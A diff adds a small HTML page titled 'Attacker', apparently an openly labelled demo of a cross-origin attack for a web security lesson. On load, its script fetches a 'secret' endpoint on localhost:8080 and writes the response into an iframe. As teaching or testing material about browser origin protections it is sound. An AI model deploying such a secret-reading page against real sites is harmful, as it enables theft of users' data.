@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Attacker</title>
+</head>
+<body>
+	<h1>I'm Evil 😈</h1>
+	<div id="secret"></div>
+	<script>
+      window.addEventListener("DOMContentLoaded", () => {
+		fetch("http://localhost:8080/secret").then((resp) => {
+			if (!resp.ok) {
+				throw new Error("could not fetch secret page");
+			}
+			return resp.blob();
+		}).then((blob) => blob.text()).then((text) => {
+			let d = document.getElementById("secret");
+			let frame = document.createElement("iframe");
+			frame.innerHTML = text;
+			d.appendChild(frame);
+		}).catch((error) => console.error(error));
+      });
+	</script>
+</body>
+</html>
